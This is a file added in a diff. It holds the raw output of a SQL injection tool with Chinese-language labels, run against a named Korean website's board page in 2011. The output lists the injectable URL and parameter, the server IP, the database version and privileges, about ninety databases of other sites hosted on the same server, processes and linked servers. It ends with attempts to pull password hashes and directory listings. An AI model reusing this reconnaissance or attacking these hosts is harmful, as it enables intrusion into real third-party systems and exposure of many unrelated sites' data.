@@ -1,0 +1,173 @@
+■漏洞信息:============================================================
+ ·URL:http://www.sfmakeup.com/kboard_eng/kboard_form.asp?page=5&category=&keyword=&table=BD_qna&action=reply&num=365
+ ·页面标题：⑵⑵ 舳狼 倔奔肺狼 咯青 - S·F MAKE UP ⑵⑵
+ ·参数:page=5&category=&keyword=&table=BD_qna&action=reply&num=365
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:221.143.22.101
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 15:07:48 GMT
+Server: Microsoft-IIS/6.0
+X-Powered-By: ASP.NET
+Content-Length: 10917
+Content-Type: text/html
+Set-Cookie: cook%5Finkey=I8085; path=/
+Set-Cookie: ASPSESSIONIDQASSSQRT=GHAMAFNDGGBJFDCMPAJNDLNG; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：sfmakeup_com
+- 用户名：sfmakeup_com
+- 版本：Microsoft SQL Server  2000 - 8.00.2039 (Intel X86) 
+	May  3 2005 23:18:38 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：KORMAKE
+- 服务名：MSSQLSERVER
+- 系统用户名：sfmakeup_com
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+abisan_co_kr	E:\DB\MSSQL\Data\abisan_co_kr.mdf	
+ag_hanternet	E:\DB\MSSQL\Data\ag_hanternet.mdf	
+agbishop	E:\DB\MSSQL\Data\agbishop.mdf	
+ansanwm_ds	E:\DB\MSSQL\Data\ansanwm_ds_Data.MDF	
+aron	e:\db\MSSQL\data\aron_Data.MDF	
+beauty	e:\db\MSSQL\data\beauty_Data.MDF	
+beefnpork	e:\db\MSSQL\data\beefnpork_Data.MDF	
+bi_go_kr	E:\DB\MSSQL\Data\bi_go_kr_Data.MDF	
+bi_hanternet	e:\db\MSSQL\data\bi_hanternet_Data.MDF	
+bogo_edu_com	E:\DB\MSSQL\Data\bogo_edu_com_Data.MDF	
+bwsystem	e:\db\MSSQL\data\bwsystem_Data.MDF	
+changdae	E:\DB\MSSQL\Data\changdae_Data.MDF	
+changdae1	e:\db\MSSQL\data\changdae1_Data.MDF	
+changdae2	e:\db\MSSQL\data\changdae2_Data.MDF	
+CoupleN	e:\db\MSSQL\data\CoupleN_Data.MDF	
+cs	e:\db\MSSQL\data\cs_Data.MDF	
+daejin	E:\DB\MSSQL\Data\daejin_Data.MDF	
+dddd	E:\DB\MSSQL\Data\dddd_Data.MDF	
+dentopia	e:\db\MSSQL\data\dentopia_Data.MDF	
+dhp	e:\db\MSSQL\data\dhp_Data.MDF	
+dooin	e:\db\MSSQL\data\dooin_Data.MDF	
+ds_solution	e:\db\MSSQL\data\ds_solution_Data.MDF	
+dw_wedding	e:\db\MSSQL\data\dw_wedding_Data.MDF	
+ebuln_com	e:\db\MSSQL\data\ebuln_com_Data.MDF	
+edenplus	e:\db\MSSQL\data\edenplus_Data.MDF	
+epinet_co_kr	E:\DB\MSSQL\Data\epinet_co_kr.mdf	
+erp_hanternet	E:\DB\MSSQL\Data\erp_hanternet_Data.MDF	
+gcard	E:\DB\MSSQL\Data\gcard_Data.MDF	
+gnparty_com	E:\DB\MSSQL\Data\gnparty_com.mdf	
+golfgrave_com	E:\DB\MSSQL\Data\golfgrave_com_Data.MDF	
+grape	E:\DB\MSSQL\Data\grape_Data.MDF	
+grape_or_kr	E:\DB\MSSQL\Data\grape_or_kr_Data.MDF	
+h_house	e:\db\MSSQL\data\h_house_Data.MDF	
+hahiho_com	e:\db\MSSQL\data\hahiho_com_Data.MDF	
+ham	E:\DB\MSSQL\Data\ham_Data.MDF	
+hana	e:\db\MSSQL\data\hana_Data.MDF	
+hanternet	E:\DB\MSSQL\Data\hanternet_Data.MDF	
+hdi	E:\DB\MSSQL\Data\hdi_Data.MDF	
+hitest	e:\db\MSSQL\data\hitest_Data.MDF	
+hj	e:\db\MSSQL\data\hj_Data.MDF	
+human	E:\DB\MSSQL\Data\human_Data.MDF	
+hycard	e:\db\MSSQL\data\hycard_Data.MDF	
+ibae_or_kr	E:\DB\MSSQL\Data\ibae_or_kr_data.mdf	
+ilsung	E:\DB\MSSQL\Data\ilsung_Data.MDF	
+istaro	e:\db\MSSQL\data\istaro_Data.MDF	
+isw_kw_ac_kr	E:\DB\MSSQL\Data\isw_kw_ac_kr_Data.MDF	
+jtowel_com	E:\DB\MSSQL\Data\jtowel_com_Data.MDF	
+jwpiano	e:\db\MSSQL\data\jwpiano_Data.MDF	
+kbipca	E:\DB\MSSQL\Data\kbipca_Data.MDF	
+kfga	e:\db\MSSQL\data\kfga_Data.MDF	
+kobis	e:\db\MSSQL\data\kobis_Data.MDF	
+kobis1	e:\db\MSSQL\data\kobis1_Data.MDF	
+koreawine	e:\db\MSSQL\data\koreawine_Data.MDF	
+kpbiz	e:\db\MSSQL\data\kpbiz_Data.MDF	
+kpmanpower	e:\db\MSSQL\data\kpmanpower_Data.MDF	
+kpmanpower2	e:\db\MSSQL\data\kpmanpower2_Data.MDF	
+kpubic	E:\DB\MSSQL\Data\kpubic_Data.MDF	
+ksgift	e:\db\MSSQL\data\ksgift_Data.MDF	
+kwubi	E:\DB\MSSQL\Data\kwubi_Data.MDF	
+kyungmin	e:\db\MSSQL\data\kyungmin_Data.MDF	
+love	e:\db\MSSQL\data\love_Data.MDF	
+m3m	e:\db\MSSQL\data\m3m_Data.MDF	
+makeup	E:\DB\MSSQL\Data\makeup_Data.MDF	
+makeup_gu	E:\DB\MSSQL\Data\makeup_gu_Data.MDF	
+makeup2	E:\DB\MSSQL\Data\makeup2_Data.MDF	
+master	e:\db\MSSQL\data\master.mdf	
+miyobi_com	E:\DB\MSSQL\Data\miyobi_com_Data.MDF	
+model	e:\db\MSSQL\data\model.mdf	
+msdb	e:\db\MSSQL\data\msdbdata.mdf	
+name35_com	E:\DB\MSSQL\Data\name35_com.mdf	
+newgrape	e:\db\MSSQL\data\newgrape_Data.MDF	
+newnpd	e:\db\MSSQL\data\newnpd_Data.MDF	
+newpeach	e:\db\MSSQL\data\newpeach_Data.MDF	
+newwon	e:\db\MSSQL\data\newwon_Data.MDF	
+no1-edt	e:\db\MSSQL\data\no1-edt_Data.MDF	
+npd	e:\db\MSSQL\data\npd_Data.MDF	
+oncetel	e:\db\MSSQL\data\oncetel_Data.MDF	
+onelpg	e:\db\MSSQL\data\onelpg_Data.MDF	
+peach	E:\DB\MSSQL\Data\peach_Data.MDF	
+piracos	E:\DB\MSSQL\Data\piracos.mdf	
+pnv	e:\db\MSSQL\data\pnv_Data.MDF	
+pr.hanternet.co.kr	e:\db\MSSQL\data\pr.hanternet.co.kr_Data.MDF	
+rs_hanternet_co_kr	E:\DB\MSSQL\Data\rs_hanternet_co_kr_Data.MDF	
+rsi_kyungmin_ac_kr	E:\DB\MSSQL\Data\rsi_kyungmin_ac_kr.mdf	
+saehp	E:\DB\MSSQL\Data\saehp_Data.MDF	
+samil	E:\DB\MSSQL\Data\samil_Data.MDF	
+semarr	e:\db\MSSQL\data\semarr_Data.MDF	
+seoul	e:\db\MSSQL\data\seoul_Data.MDF	
+sfmakeup_com	E:\DB\MSSQL\Data\sfmakeup_com.mdf	
+shcdt	e:\db\MSSQL\data\shcdt_Data.MDF	
+shop_safefree	e:\db\self_hanternet_Data.MDF	
+SISEOL_COMBINE	E:\DB\MSSQL\Data\SISEOL_COMBINE.mdf	
+smba	e:\db\MSSQL\data\smba_Data.MDF	
+smba2	e:\db\MSSQL\data\smba2_Data.MDF	
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+dbo			08  6 2000  1:27AM	
+guest	.	.	08  6 2000  1:27AM	
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+SQLAgent - Generic Refresher	sleeping	KORMAKE	2460	AWAITING COMMAND	SYSTEM	
+SQLAgent - Alert Engine	sleeping	KORMAKE	2460	AWAITING COMMAND	SYSTEM	
+Internet Information Services	sleeping	KORMAKE	10132	AWAITING COMMAND		
+Internet Information Services	sleeping	KORMAKE	10132	AWAITING COMMAND		
+Internet Information Services	sleeping	KORMAKE	10132	AWAITING COMMAND		
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+KORMAKE	SQL Server	SQLOLEDB	KORMAKE		KORMAKE	
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+Dir of D:: 
+一次性获取失败，正在批次获取……
